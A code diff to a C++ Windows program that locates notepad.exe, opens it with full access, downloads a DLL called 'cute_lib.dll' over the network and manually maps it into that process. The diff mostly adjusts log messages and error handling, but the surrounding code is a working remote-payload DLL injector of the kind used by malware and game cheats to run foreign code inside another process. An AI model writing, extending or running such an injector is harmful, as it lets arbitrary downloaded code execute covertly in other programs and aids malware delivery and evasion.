@@ -110,7 +110,6 @@ HANDLE GetProcessHANDLE(const wchar_t* processName)
     //     bRet = Process32Next(hSnap, &PE32);
     // }CloseHandle(hSnap);
 
-    norm("Trying to get a handle to the process...\n");
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot != INVALID_HANDLE_VALUE)
     {
@@ -132,18 +131,17 @@ HANDLE GetProcessHANDLE(const wchar_t* processName)
 
     if (PID == 0)
     {
-        fuk("[Target process not found]\n");
+        fuk("Target process not found");
         return nullptr;
     } norm("Process ID: ", CYAN"", PID, "\n");
 
 
-    norm("-> Attempting to open process");
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
     if (!hProc)
     {
         fuk("[!] Failed to open process: ", GetLastError(), "\n");
         return nullptr;
-    } norm(GREEN"\t\t[DONE]\n");
+    }
 
     return hProc;
 }
@@ -151,11 +149,14 @@ HANDLE GetProcessHANDLE(const wchar_t* processName)
 int main()
 {
     HANDLE hProc = GetProcessHANDLE(L"notepad.exe");
-    if(!hProc) fuk("Somethig went wrong");
+    if(!hProc) { fuk("Somethig went wrong"); return 1; }
     else norm("hProc -> " ,CYAN"", hProc, "\n");
 
     load_dll();
     std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
+    if(downloaded_dll.empty()) fuk("Download fail\n");
+    else { norm("\n"); ok("download done"); }
+
 
     if(!ManualMap(hProc, &downloaded_dll))
     {
